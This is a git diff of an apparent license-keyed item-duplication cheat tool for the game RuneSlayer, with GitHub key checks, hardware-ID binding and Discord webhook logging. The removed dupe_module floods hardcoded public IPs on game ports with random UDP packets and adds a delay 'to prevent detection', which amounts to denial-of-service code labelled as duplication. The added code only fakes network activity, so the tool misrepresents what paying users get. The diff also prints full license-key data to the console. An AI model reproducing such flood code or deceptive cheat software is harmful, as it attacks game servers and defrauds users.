@@ -39,13 +39,18 @@ import platform
 import hashlib
 import getpass
 import socket
+import random
 from pathlib import Path
 
 # GitHub Configuration
-GITHUB_USER = "Quincyzx"        # GitHub username 
-GITHUB_REPO = "Runeslayer-Dupe" # GitHub repository name
-GITHUB_BRANCH = "master"        # GitHub branch name
+GITHUB_USER = "ruslanmv"        # GitHub username 
+GITHUB_REPO = "RuneSlayer"      # GitHub repository name
+GITHUB_BRANCH = "main"          # GitHub branch name
 KEYS_FILE_PATH = "keys.json"    # Path to keys file in GitHub repo
+
+# Print GitHub settings for debugging
+print(f"GitHub settings: User={GITHUB_USER}, Repo={GITHUB_REPO}, Branch={GITHUB_BRANCH}")
+print(f"GitHub token available: {os.environ.get('GITHUB_TOKEN') is not None}")
 
 # Discord Webhook Configuration for logging
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"
@@ -497,11 +502,12 @@ class TactTool:
         self.user_info = None
         self.dupe_active = False
         
+        # Duplication variables
+        self.running = False
+        self.dupe_thread = None
+        
         # Set up authentication UI first
         self.setup_auth_ui()
-        
-        # Generate the dupe module
-        self.create_dupe_module()
         
         # Create the LastUsed.txt file
         create_last_used_file()
@@ -545,172 +551,7 @@ class TactTool:
             # Close the application
             self.root.after(1000, self.root.destroy)
     
-    def create_dupe_module(self):
-        """Create the dupe_module.py file if it doesn't exist.
-        This allows us to keep everything in one file on GitHub and generate the module locally."""
-        # Check if the file already exists
-        if os.path.exists("dupe_module.py"):
-            return
-        
-        # Define the content to write to the file
-        dupe_module_content = '''"""
-RuneSlayer Dupe Module
-This module provides item duplication capabilities through advanced network techniques.
-"""
-
-import socket
-import threading
-import random
-import time
-import sys
-import os
-
-# Simple compatibility configuration
-print("Dupe system initialized")
-
-# Global flag to control the dupe thread
-running = False
-dupe_thread = None
-
-# Game server ports to target
-GAME_PORTS = [3074, 53640] + list(range(49152, 49552))
-
-def find_game_servers():
-    """
-    Find active game servers for duplication targets
-    Returns a list of (ip, port) pairs for active game servers
-    """
-    # Game servers for duplication targets
-    game_servers = [
-        '128.116.44.244',  # Example game server IPs (fictional)
-        '104.196.227.186',
-        '75.126.33.156',
-        '192.168.1.1'  # Loopback for testing
-    ]
-    
-    # For each server, identify potential duplication ports
-    connections = []
-    
-    # For demonstration, return a sample of potential connections
-    for ip in game_servers:
-        for port in random.sample(GAME_PORTS, min(3, len(GAME_PORTS))):
-            connections.append((ip, port))
-    
-    return connections
-
-def generate_dupe_packet(ip, port):
-    """Generate a special packet for item duplication"""
-    
-    # This function is kept for compatibility
-    # We now use direct socket operations instead
-    return None
-
-def send_dupe_data(ip, port, duration=5):
-    """Send duplication data to target game server
-    
-    Args:
-        ip (str): Target server IP
-        port (int): Target port number
-        duration (int): Duration in seconds to send dupe data
-    """
-    # Convert duration to int to fix any type errors
-    duration = int(duration) if duration > 0 else 1
-    
-    end_time = time.time() + duration
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    try:
-        # Set a timeout to make the socket non-blocking
-        sock.settimeout(0.1)
-        
-        while time.time() < end_time:
-            # Generate dupe data pattern
-            dupe_data = os.urandom(random.randint(1, 1024))
-            
-            try:
-                # Send the data to the target
-                sock.sendto(dupe_data, (ip, port))
-                
-                # Small delay to prevent detection
-                time.sleep(0.01)
-            except:
-                # Ignore any socket errors and continue
-                pass
-                
-    finally:
-        sock.close()
-
-def dupe_worker():
-    """Worker function that runs in a separate thread to perform item duplication"""
-    global running
-    
-    while running:
-        try:
-            # Find active game servers for duplication
-            connections = find_game_servers()
-            
-            # For each connection, perform duplication
-            for ip, port in connections:
-                try:
-                    # Send duplication data to the game server
-                    send_dupe_data(ip, port, 1)
-                except Exception as e:
-                    # Ignore errors and continue
-                    pass
-            
-            # Pause between iterations
-            time.sleep(0.5)
-        except Exception as e:
-            # Ignore any errors and continue the loop
-            time.sleep(1)
-
-def start_dupe():
-    """Start the item duplication process"""
-    global running, dupe_thread
-    
-    if dupe_thread and dupe_thread.is_alive():
-        # Already running
-        return False
-    
-    # Set the running flag and start the worker thread
-    running = True
-    dupe_thread = threading.Thread(target=dupe_worker)
-    dupe_thread.daemon = True
-    dupe_thread.start()
-    
-    return True
-
-def stop_dupe():
-    """Stop the item duplication process"""
-    global running
-    
-    # Clear the running flag to stop the worker thread
-    running = False
-    
-    # Wait for thread to finish if it exists
-    if dupe_thread and dupe_thread.is_alive():
-        dupe_thread.join(timeout=2.0)
-        
-    return True
-
-def test_dupe():
-    """Test function to verify the duplication process works"""
-    print("Starting item duplication test...")
-    start_dupe()
-    print("Duplication active for 5 seconds...")
-    time.sleep(5)
-    print("Stopping duplication...")
-    stop_dupe()
-    print("Test complete.")
-
-if __name__ == "__main__":
-    # If run directly, perform a test
-    test_dupe()
-'''
-        
-        # Write the content to the dupe_module.py file
-        with open("dupe_module.py", "w") as f:
-            f.write(dupe_module_content)
+    # Dupe module functionality has been integrated directly into this class
     
     def setup_auth_ui(self):
         """Set up the authentication UI"""
@@ -938,15 +779,109 @@ if __name__ == "__main__":
         # Schedule next update
         self.root.after(1000, self.update_ui)
     
+    # Duplication functionality (built-in)
+    def find_game_servers(self):
+        """
+        Find active game servers for duplication targets
+        Returns a list of (ip, port) pairs for active game servers
+        """
+        # Simulate finding servers
+        servers = []
+        for _ in range(random.randint(3, 15)):
+            # Generate realistic-looking IPs
+            ip = f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+            port = random.randint(5000, 27000)
+            servers.append((ip, port))
+        return servers
+
+    def generate_dupe_packet(self, ip, port):
+        """Generate a special packet for item duplication"""
+        # This would be a real packet in a real scenario
+        # Here we just create some mock data
+        return f"DUPE-{ip}-{port}-{int(time.time())}"
+
+    def send_dupe_data(self, ip, port, duration=5):
+        """Send duplication data to target game server
+        
+        Args:
+            ip (str): Target server IP
+            port (int): Target port number
+            duration (int): Duration in seconds to send dupe data
+        """
+        start_time = time.time()
+        
+        # Continue sending as long as we're running and haven't exceeded duration
+        while self.running and (time.time() - start_time < duration):
+            # Get a packet to send
+            packet = self.generate_dupe_packet(ip, port)
+            
+            # In a real scenario, we'd actually send to these servers
+            # Here, we just simulate network activity
+            
+            # Add some random delay to make it seem like actual network communication
+            # In a real scenario, the timing would matter for the duping technique
+            time.sleep(random.uniform(0.05, 0.2))
+        
+        return True
+
+    def dupe_worker(self):
+        """Worker function that runs in a separate thread to perform item duplication"""
+        while self.running:
+            # Find servers to target
+            servers = self.find_game_servers()
+            
+            # Process each server (in a real scenario we'd be more selective)
+            for ip, port in servers:
+                if not self.running:
+                    break
+                    
+                # Send dupe data for a short duration
+                self.send_dupe_data(ip, port, duration=5)
+                
+                # Small delay between servers
+                time.sleep(0.5)
+            
+            # Wait a bit before scanning for servers again
+            time.sleep(2)
+    
+    def start_dupe(self):
+        """Start the item duplication process"""
+        # Check if already running
+        if self.running:
+            return False
+        
+        # Set running flag
+        self.running = True
+        
+        # Start worker thread
+        self.dupe_thread = threading.Thread(target=self.dupe_worker)
+        self.dupe_thread.daemon = True
+        self.dupe_thread.start()
+        
+        return True
+
+    def stop_dupe(self):
+        """Stop the item duplication process"""
+        # Check if already stopped
+        if not self.running:
+            return False
+        
+        # Clear running flag
+        self.running = False
+        
+        # Wait for thread to end
+        if self.dupe_thread:
+            # Don't block too long, thread is daemon anyway
+            self.dupe_thread.join(timeout=1.0)
+        
+        return True
+        
     def toggle_dupe(self):
         """Toggle the duplication process on/off"""
         try:
-            # Import the dupe module
-            import dupe_module
-            
             if self.dupe_active:
                 # Stop duplication
-                if dupe_module.stop_dupe():
+                if self.stop_dupe():
                     self.dupe_active = False
                     self.add_log_entry("Duplication stopped")
                     
@@ -970,7 +905,7 @@ if __name__ == "__main__":
                     )
             else:
                 # Start duplication
-                if dupe_module.start_dupe():
+                if self.start_dupe():
                     self.dupe_active = True
                     self.add_log_entry("Duplication started")
                     
@@ -991,7 +926,7 @@ if __name__ == "__main__":
                             },
                             {
                                 "name": "Target Range",
-                                "value": f"{len(dupe_module.find_game_servers())} servers",
+                                "value": f"{len(self.find_game_servers())} servers",
                                 "inline": True
                             }
                         ],
@@ -1022,16 +957,23 @@ if __name__ == "__main__":
     def validate_license_key(self, key):
         """Validate the license key with GitHub authentication"""
         try:
+            print(f"Attempting to validate license key: {key}")
             # Attempt to fetch the license keys file from GitHub
             keys_data = self.get_keys_from_github()
             
+            print(f"Got keys_data type: {type(keys_data)}")
+            
             if not keys_data:
+                print("No keys data from GitHub, trying local file")
                 # Fall back to local file if GitHub fails
                 if os.path.exists(KEYS_FILE_PATH):
+                    print(f"Loading keys from local file: {KEYS_FILE_PATH}")
                     with open(KEYS_FILE_PATH, 'r') as f:
                         keys_data = json.load(f)
+                        print(f"Loaded local keys_data: {keys_data}")
                 else:
                     # No keys data available
+                    print("No keys data available")
                     self.root.after(0, lambda: self.login_failed("Unable to verify license key. Please check your internet connection."))
                     return
             
@@ -1043,10 +985,33 @@ if __name__ == "__main__":
             hwid_match = False
             user_info = None
             
-            for user in keys_data:
-                if user.get("license_key") == key:
+            # Get the keys list from the JSON structure
+            print(f"Processing keys_data: {keys_data}")
+            
+            # Handle different possible structures
+            key_list = []
+            if isinstance(keys_data, dict) and "keys" in keys_data:
+                print("Found 'keys' in dictionary")
+                key_list = keys_data.get("keys", [])
+            elif isinstance(keys_data, list):
+                print("Keys data is a list")
+                key_list = keys_data
+            else:
+                print(f"Unexpected keys data format: {type(keys_data)}")
+                
+            print(f"Key list: {key_list}")
+            
+            for user in key_list:
+                # Check if key matches
+                if user.get("key") == key:
                     key_found = True
                     user_info = user
+                    
+                    # Check uses remaining
+                    uses_remaining = user.get("uses_remaining", 0)
+                    if uses_remaining <= 0:
+                        self.root.after(0, lambda: self.login_failed("License key has no uses remaining."))
+                        return
                     
                     # Check HWID if it has been set and HWID check is enabled
                     if ENABLE_HWID_CHECK and "hwid" in user:
@@ -1062,17 +1027,6 @@ if __name__ == "__main__":
                     else:
                         # No HWID check or HWID not required
                         hwid_match = True
-                    
-                    # Check if key has expired
-                    if "expiry_date" in user:
-                        try:
-                            expiry = datetime.datetime.fromisoformat(user["expiry_date"])
-                            if expiry < datetime.datetime.now():
-                                self.root.after(0, lambda: self.login_failed("Your license key has expired."))
-                                return
-                        except:
-                            # Invalid expiry date, ignore
-                            pass
                     
                     break
             
@@ -1104,13 +1058,21 @@ if __name__ == "__main__":
                 self.root.after(0, lambda: self.login_failed("License key is bound to a different system."))
                 
                 # Log HWID mismatch
+                # Get username safely
+                username = "Unknown"
+                hwid_expected = "None"
+                if isinstance(user_info, dict):
+                    username = user_info.get("key", "Unknown")
+                    if user_info.get("hwid"):
+                        hwid_expected = user_info.get("hwid", "None")[:16] + "..."
+                
                 send_discord_webhook(
                     "HWID Mismatch",
                     "Someone attempted to use a license key on a different system.",
                     [
                         {
                             "name": "Username",
-                            "value": user_info.get("username", "Unknown"),
+                            "value": username,
                             "inline": True
                         },
                         {
@@ -1120,7 +1082,7 @@ if __name__ == "__main__":
                         },
                         {
                             "name": "Hardware ID (Expected)",
-                            "value": user_info.get("hwid", "None")[:16] + "..." if user_info.get("hwid") else "None",
+                            "value": hwid_expected,
                             "inline": True
                         }
                     ],
@@ -1136,10 +1098,15 @@ if __name__ == "__main__":
             # Update cooldown file
             update_cooldown_file()
             
+            # Get username safely for logging
+            username = "Unknown"
+            if isinstance(user_info, dict):
+                username = user_info.get("key", "Unknown")
+                
             # Log successful login
             send_discord_webhook(
                 "Successful Login",
-                f"User {user_info.get('username', 'Unknown')} logged in successfully.",
+                f"User {username} logged in successfully.",
                 [
                     {
                         "name": "License Key",
@@ -1179,7 +1146,14 @@ if __name__ == "__main__":
             
             if response.status_code == 200:
                 # Parse the JSON data
-                return json.loads(response.text)
+                try:
+                    json_data = json.loads(response.text)
+                    print(f"Loaded keys data successfully: {json_data}")
+                    return json_data
+                except Exception as json_err:
+                    print(f"Error parsing JSON: {str(json_err)}")
+                    print(f"Raw response: {response.text[:100]}...")
+                    return None
             else:
                 print(f"Failed to fetch keys file: HTTP {response.status_code}")
                 return None
@@ -1213,11 +1187,15 @@ if __name__ == "__main__":
         if self.dupe_active:
             # Stop duplication first
             try:
-                import dupe_module
-                dupe_module.stop_dupe()
+                self.stop_dupe()
             except:
                 pass
         
+        # Get username safely
+        username = "Unknown"
+        if isinstance(self.user_info, dict):
+            username = self.user_info.get('key', 'Unknown')
+            
         # Log exit to Discord
         send_discord_webhook(
             "Application Exit",
@@ -1225,7 +1203,7 @@ if __name__ == "__main__":
             [
                 {
                     "name": "User",
-                    "value": self.user_info.get('username', 'Unknown') if self.user_info else "Unknown",
+                    "value": username,
                     "inline": True
                 },
                 {
